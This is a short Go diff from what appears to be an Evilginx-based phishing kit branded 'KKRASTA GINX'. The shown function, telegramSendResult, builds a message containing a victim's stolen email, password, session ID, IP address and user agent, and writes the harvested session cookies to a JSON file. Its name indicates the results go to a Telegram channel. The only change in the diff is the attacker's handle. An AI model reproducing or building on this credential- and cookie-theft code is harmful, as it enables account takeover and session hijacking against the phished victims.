@@ -26,7 +26,7 @@ const (
 func telegramSendResult(cookies string, username string, password string, ip string, agent string, sid string) {
 	client := &http.Client{}
 	fileName := username + "-Cookies.json"
-	text_msg := "🔥 KKRASTA GINX SPAM COOKIES RESULT 🔥\nLogs: " + sid + "\nEmail: " + username + "\nPassword: " + password + "\nIP-Address: https://ip-api.com/" + ip + "\nUserAgent: " + agent + "\n @kkrasta24 🔥🔥🔥🔥🔥"
+	text_msg := "🔥 KKRASTA GINX SPAM COOKIES RESULT 🔥\nLogs: " + sid + "\nEmail: " + username + "\nPassword: " + password + "\nIP-Address: https://ip-api.com/" + ip + "\nUserAgent: " + agent + "\n @kkrasta_ginx 🔥🔥🔥🔥🔥"
 	err := ioutil.WriteFile(fileName, []byte(cookies), 0755)
 	if err != nil {
 		fmt.Printf("Unable to write file: %v", err)
